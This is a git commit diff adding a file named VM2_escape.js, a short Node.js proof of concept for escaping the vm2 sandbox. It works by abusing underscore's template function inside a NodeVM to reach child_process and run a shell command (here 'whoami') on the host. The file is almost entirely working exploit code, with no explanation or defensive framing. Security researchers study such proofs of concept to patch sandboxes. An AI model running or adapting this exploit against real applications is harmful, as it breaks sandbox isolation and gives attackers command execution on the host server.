dc20c16deeb9e854c369723bf9d55eb4a1d50a09
Sibivasan M <47232035+sibivasanM@users.noreply.github.com>
2024-05-30 00:30:16 +0530

    Update VM2_escape.js

--- VM2_escape.js
+++ VM2_escape.js
@@ -1,1 +1,16 @@
+const express = require('express');
+const app = express();
+const { NodeVM } = require('vm2');
+const underscore = require('underscore')
+const under = underscore()
+const vm = new NodeVM({
+    require:{
+        external: {
+            modules: ["underscore"]
+        }
+    }
+});
 
+script = `console.log(require('underscore').template("<% print(this.process.mainModule.require('child_process').execSync('whoami')) %>")())`
+
+vm.run(script,'vm.js')
